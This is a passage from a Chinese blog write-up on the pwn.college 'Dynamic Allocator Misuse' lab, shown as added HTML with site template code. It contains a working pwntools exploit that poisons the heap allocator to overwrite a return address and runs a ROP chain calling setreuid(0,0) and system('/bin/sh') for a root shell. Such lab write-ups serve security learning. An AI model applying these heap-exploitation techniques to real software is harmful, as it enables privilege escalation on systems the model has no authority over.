class="hljs-string">&quot;stack_addr:&quot;</span>,<span class="hljs-built_in">hex</span>(stack_addr))<br>ret_addr = stack_addr-<span class="hljs-number">0x120</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ret_addr:&quot;</span>,<span class="hljs-built_in">hex</span>(ret_addr))<br><br><span class="hljs-comment"># for overwriting ret_addr</span><br>malloc(<span class="hljs-number">0</span>, <span class="hljs-number">0x38</span>)<br>malloc(<span class="hljs-number">1</span>, <span class="hljs-number">0x38</span>)<br>malloc(<span class="hljs-number">2</span>, <span class="hljs-number">0x38</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br>safe_read(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + p64(<span class="hljs-number">0x41</span>) + p64((heap_base_addr &gt;&gt; <span class="hljs-number">12</span>) ^ (ret_addr - <span class="hljs-number">0x8</span>)))<br>malloc(<span class="hljs-number">1</span>, <span class="hljs-number">0x38</span>)<br>malloc(<span class="hljs-number">3</span>, <span class="hljs-number">0x38</span>)     <span class="hljs-comment"># 3-&gt;ret_addr</span><br><br><span class="hljs-comment"># ROP chain</span><br>libc.address = libc_base<br>sys_addr = libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>setreuid_addr = libc.symbols[<span class="hljs-string">&#x27;setreuid&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;setreuid_addr&quot;</span>, <span class="hljs-built_in">hex</span>(setreuid_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;binsh_addr&quot;</span>, <span class="hljs-built_in">hex</span>(binsh_addr))<br>rop = ROP(libc)<br>ruid = <span class="hljs-number">0</span>    <span class="hljs-comment"># 其实只需要ruid为0就能够拿到root shell</span><br>euid = <span class="hljs-number">0</span><br><span class="hljs-comment"># rop.raw(rop.ret)</span><br>rop.raw(rop.rdi)<br>rop.raw(ruid)<br>rop.raw(rop.rsi)<br>rop.raw(euid)<br>rop.raw(setreuid_addr)<br>rop.raw(rop.rdi)<br>rop.raw(binsh_addr)<br>rop.raw(sys_addr)<br><br><span class="hljs-comment"># overwrite</span><br>safe_read(<span class="hljs-number">3</span>, p64(<span class="hljs-number">0xdeadbeef</span>) + rop.chain())<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/safe_write/safe_read/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;quit&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h4 id="level20-1"><a href="#level20-1" class="headerlink" title="level20.1"></a>level20.1</h4><p>改下heap区的libc泄露偏移即可。还有删下<code>p.recvline()</code></p>
+<p><strong>Dynamic Allocator Misuse 完结撒花~</strong></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Pwn/" class="category-chain-item">Pwn</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Pwn/" class="print-no-link">#Pwn</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>pwn.college: Dynamic Allocator Misuse</div>
+      <div>https://loboq1ng.github.io/2025/04/21/pwn-college-Dynamic-Allocator-Misuse/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Lobo Q1ng</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年4月21日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/05/11/pwn-college-Program-Exploitation/" title="pwn.college: Program Exploitation">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">pwn.college: Program Exploitation</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/04/18/FuzzJIT-%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/" title="FuzzJIT:论文阅读">
+                        <span class="hidden-mobile">FuzzJIT:论文阅读</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
